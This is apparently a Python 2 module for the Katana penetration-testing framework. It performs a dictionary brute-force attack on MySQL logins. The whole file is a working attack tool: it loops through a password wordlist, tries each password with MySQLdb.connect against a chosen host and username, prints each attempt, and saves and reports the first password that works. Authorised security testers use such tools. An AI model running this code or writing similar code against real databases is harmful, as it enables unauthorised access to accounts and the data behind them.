# This module requires katana framework 
# https://github.com/RedToor/Katana
# :-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Katana Core                 #
from core.design import *     #
from core.Setting import *    #
from core import Errors       #
from core import getFunction  #
import sys                    #
Message=DESIGN()              #
# :-:-:-:-:-:-:-:-:-:-:-:-:-: #
# Libraries                   #
import MySQLdb                #
# :-:-:-:-:-:-:-:-:-:-:-:-:-: #

# INFORMATION MODULE
def initialize():
	initialize.Author             ="RedToor"
	initialize.Version            ="1.1"
	initialize.Despcription       ="Brute Force to SQL protocol."
	initialize.CodeName           ="btf/pr.sql"
	initialize.DateCreation       ="16/05/2015"      
	initialize.LastModification   ="25/03/2016"

	# DEFAULT VARIABLES             VALUE                  NAME        RQ     DESCRIPTION
	initialize.DEFAULT_VARIABLE   =[[LOCAL_IP            , "target" , "yes" , "IP or DNS"]]         #[0][0]
	initialize.DEFAULT_VARIABLE  +=[[SQL_PORT            , "port"   , "no"  , "Service port"]]      #[1][0]
	initialize.DEFAULT_VARIABLE  +=[[USERNAME            , "user"   , "yes" , "Username target"]]   #[2][0]
	initialize.DEFAULT_VARIABLE  +=[[DITIONARY_PASSWORDS , "dict"   , "no"  , "Wordlist"]]          #[3][0]
initialize()
# END INFORMATION MODULE

# MAIN FUNCTION
def main(run):
	try:
		# HEAD MODULE
		if run:	actions=raw_input(Message.prompt(initialize.CodeName))
		else  : actions="run"
		if getFunction.KatanaCheckActionShowOptions(actions)  :getFunction.ShowOptions(initialize.DEFAULT_VARIABLE)
		elif getFunction.KatanaCheckActionSetValue(actions)   :initialize.DEFAULT_VARIABLE=getFunction.UpdateValue(actions,initialize.DEFAULT_VARIABLE)
		elif getFunction.KatanaCheckActionisBack(actions)     :return
		# END HEAD MODULE
		elif getFunction.runModule(actions):
			Message.run()
			# CODE MODULE    ############################################################################################
			try:
				getFunction.live(initialize.DEFAULT_VARIABLE[0][0],initialize.DEFAULT_VARIABLE[1][0])
				if True:
					try:
						Message.loading_file()
						with open(initialize.DEFAULT_VARIABLE[3][0],'r') as passwords:
							for ps in passwords:
								ps=ps.replace("\n","")
								try:
									MySQLdb.connect(initialize.DEFAULT_VARIABLE[0][0],initialize.DEFAULT_VARIABLE[2][0],ps,'')
									if True:
										getFunction.save("BruteForceSQL",initialize.DEFAULT_VARIABLE[0][0],initialize.DEFAULT_VARIABLE[1][0],initialize.DEFAULT_VARIABLE[2][0],ps)
										Message.Success(initialize.DEFAULT_VARIABLE[2][0],ps)
										break
								except:
									print " "+Alr+" Checking ("+initialize.DEFAULT_VARIABLE[2][0]+"="+ps+")"
					except:
						Errors.Errors(event=sys.exc_info(), info=initialize.DEFAULT_VARIABLE[3][0])
			except:
				Errors.Errors(event=sys.exc_info(), info=initialize.DEFAULT_VARIABLE[0][0]+":"+initialize.DEFAULT_VARIABLE[1][0])
			# END CODE MODULE ############################################################################################
		else:
			getFunction.KatanaCheckActionGlobalCommands(actions)
	# ERROR GENERAL
	except:
		Errors.Errors(event=sys.exc_info(), info=sys.exc_traceback.tb_lineno)
	# END ERROR GENERAL
	main(True)
# END MAIN FUNCTION

# LINKER FUNCTION
def run(target,port,username,dictionary):
	initialize.DEFAULT_VARIABLE[0][0] = target
	initialize.DEFAULT_VARIABLE[1][0] = port
	initialize.DEFAULT_VARIABLE[2][0] = username
	initialize.DEFAULT_VARIABLE[3][0] = dictionary
	main(False)
# END LINKER FUNCTION
